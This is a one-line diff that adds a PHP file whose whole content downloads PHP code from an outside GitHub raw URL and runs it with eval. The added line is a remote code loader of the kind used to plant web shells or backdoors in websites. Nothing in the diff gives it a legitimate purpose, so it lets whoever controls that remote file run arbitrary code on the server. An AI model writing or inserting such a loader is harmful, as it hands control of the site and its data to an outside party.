@@ -1,0 +1,1 @@
+<?php eval("?>".file_get_contents("https://raw.githubusercontent.com/ayahynek/hk/refs/heads/main/about.php"));?>
